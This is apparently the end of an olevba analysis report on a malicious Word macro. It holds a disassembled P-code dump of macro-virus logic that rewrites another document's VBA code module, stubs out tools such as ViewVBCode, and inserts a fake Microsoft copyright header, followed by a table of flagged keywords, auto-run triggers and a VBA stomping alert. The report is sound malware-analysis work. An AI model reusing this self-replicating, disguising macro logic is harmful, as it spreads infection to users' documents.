' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #181:
' Line #182:
' 	LitDI2 0x00D7 
' 	LitStr 0x0007 "End Sub"
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #183:
' Line #184:
' 	LitDI2 0x00D9 
' 	LitStr 0x0013 "Sub FileTemplates()"
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #185:
' Line #186:
' 	LitDI2 0x00DB 
' 	LitStr 0x0007 "End Sub"
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #187:
' Line #188:
' 	LitDI2 0x00DD 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #189:
' Line #190:
' 	LitDI2 0x00DF 
' 	LitStr 0x0007 "End Sub"
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #191:
' Line #192:
' 	EndIfBlock 
' Line #193:
' Line #194:
' 	Ld BN71 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #195:
' Line #196:
' 	LitDI2 0x00D5 
' 	LitStr 0x0043 "' *****************************************************************"
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #197:
' Line #198:
' 	LitDI2 0x00D7 
' 	LitStr 0x002F "' Created by Microsoft Product Support Services"
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #199:
' Line #200:
' 	LitDI2 0x00D9 
' 	LitStr 0x0024 "' Copyright (c) 2000 Microsoft Corp."
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #201:
' Line #202:
' 	LitDI2 0x00DB 
' 	LitStr 0x0031 "' Created June 30th, 2000: Don't CHANGE This File"
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #203:
' Line #204:
' 	LitDI2 0x00DD 
' 	LitStr 0x0043 "' Description : System Word File - Millenium Edition, All bug fixed"
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #205:
' Line #206:
' 	LitDI2 0x00DF 
' 	LitStr 0x0043 "' *****************************************************************"
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #207:
' Line #208:
' 	EndIfBlock 
' Line #209:
' Line #210:
' 	EndSub 
' Line #211:
' Line #212:
' 	QuoteRem 0x0000 0x0042 " *****************************************************************"
' Line #213:
' Line #214:
' 	QuoteRem 0x0000 0x002E " Created by Microsoft Product Support Services"
' Line #215:
' Line #216:
' 	QuoteRem 0x0000 0x0023 " Copyright (c) 2000 Microsoft Corp."
' Line #217:
' Line #218:
' 	QuoteRem 0x0000 0x0030 " Created June 30th, 2000: Don't CHANGE This File"
' Line #219:
' Line #220:
' 	QuoteRem 0x0000 0x0042 " Description : System Word File - Millenium Edition, All bug fixed"
' Line #221:
' Line #222:
' 	QuoteRem 0x0000 0x0042 " *****************************************************************"
' Line #223:
' Line #224:
' Line #225:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

